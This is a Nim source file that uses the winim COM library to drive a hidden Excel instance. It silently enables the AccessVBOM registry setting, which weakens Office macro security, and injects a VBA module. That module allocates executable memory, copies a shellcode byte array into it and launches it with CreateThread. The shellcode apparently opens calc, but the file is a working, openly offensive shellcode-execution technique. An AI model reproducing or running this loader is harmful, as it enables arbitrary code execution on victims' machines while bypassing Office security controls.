#[
    This is some funky shit.

    Winim allows you to use COM objects like a script via the "comScript" macro.

    References:
        - https://gist.github.com/enigma0x3/469d82d1b7ecaf84f4fb9e6c392d25ba
]#

import strformat
import winim/com

comScript:
    var objExcel = CreateObject("Excel.Application")
    objExcel.Visible = false
    var WshShell = CreateObject("WScript.Shell")
    var Application_Version = objExcel.Version
    var strRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Excel\Security\AccessVBOM"
    WshShell.RegWrite(strRegPath, 1, "REG_DWORD")
    var objWorkbook = objExcel.Workbooks.Add()
    var xlmodule = objWorkbook.VBProject.VBComponents.Add(1)

    var strCode = "#If Vba7 Then\n"
    strCode = strCode & "Private Declare PtrSafe Function CreateThread Lib \"kernel32\" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As LongPtr, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As LongPtr\n"
    strCode = strCode & "Private Declare PtrSafe Function VirtualAlloc Lib \"kernel32\" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As LongPtr\n"
    strCode = strCode & "Private Declare PtrSafe Function RtlMoveMemory Lib \"kernel32\" (ByVal Dkhnszol As LongPtr, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As LongPtr\n"
    strCode = strCode & "#Else\n"
    strCode = strCode & "Private Declare Function CreateThread Lib \"kernel32\" (ByVal Zopqv As Long, ByVal Xhxi As Long, ByVal Mqnynfb As Long, Tfe As Long, ByVal Zukax As Long, Rlere As Long) As Long\n"
    strCode = strCode & "Private Declare Function VirtualAlloc Lib \"kernel32\" (ByVal Xwl As Long, ByVal Sstjltuas As Long, ByVal Bnyltjw As Long, ByVal Rso As Long) As Long\n"
    strCode = strCode & "Private Declare Function RtlMoveMemory Lib \"kernel32\" (ByVal Dkhnszol As Long, ByRef Wwgtgy As Any, ByVal Hrkmuos As Long) As Long\n"
    strCode = strCode & "#EndIf\n"
    strCode = strCode & "\n"
    strCode = strCode & "Sub ExecShell()\n"
    strCode = strCode & "        Dim Wyzayxya As Long, Hyeyhafxp As Variant, Lezhtplzi As Long, Zolde As Long\n"
    strCode = strCode & "#If Vba7 Then\n"
    strCode = strCode & "        Dim  Xlbufvetp As LongPtr\n"
    strCode = strCode & "#Else\n"
    strCode = strCode & "        Dim  Xlbufvetp As Long\n"
    strCode = strCode & "#EndIf\n"
    strCode = strCode & "        Hyeyhafxp = Array(232,137,0,0,0,96,137,229,49,210,100,139,82,48,139,82,12,139,82,20, _\n"
    strCode = strCode & "139,114,40,15,183,74,38,49,255,49,192,172,60,97,124,2,44,32,193,207, _\n"
    strCode = strCode & "13,1,199,226,240,82,87,139,82,16,139,66,60,1,208,139,64,120,133,192, _\n"
    strCode = strCode & "116,74,1,208,80,139,72,24,139,88,32,1,211,227,60,73,139,52,139,1, _\n"
    strCode = strCode & "214,49,255,49,192,172,193,207,13,1,199,56,224,117,244,3,125,248,59,125, _\n"
    strCode = strCode & "36,117,226,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4, _\n"
    strCode = strCode & "139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,88,95,90,139,18, _\n"
    strCode = strCode & "235,134,93,106,1,141,133,185,0,0,0,80,104,49,139,111,135,255,213,187, _\n"
    strCode = strCode & "224,29,42,10,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5, _\n"
    strCode = strCode & "187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)\n"
    strCode = strCode & "        Xlbufvetp = VirtualAlloc(0, UBound(Hyeyhafxp), &H1000, &H40)\n"
    strCode = strCode & "        For Zolde = LBound(Hyeyhafxp) To UBound(Hyeyhafxp)\n"
    strCode = strCode & "                Wyzayxya = Hyeyhafxp(Zolde)\n"
    strCode = strCode & "                Lezhtplzi = RtlMoveMemory(Xlbufvetp + Zolde, Wyzayxya, 1)\n"
    strCode = strCode & "        Next Zolde\n"
    strCode = strCode & "        Lezhtplzi = CreateThread(0, 0, Xlbufvetp, 0, 0, 0)\n"
    strCode = strCode & "End Sub\n"

    xlmodule.CodeModule.AddFromString(strCode)
    objExcel.Run("ExecShell")
    objExcel.DisplayAlerts = false
    objWorkbook.Close(false)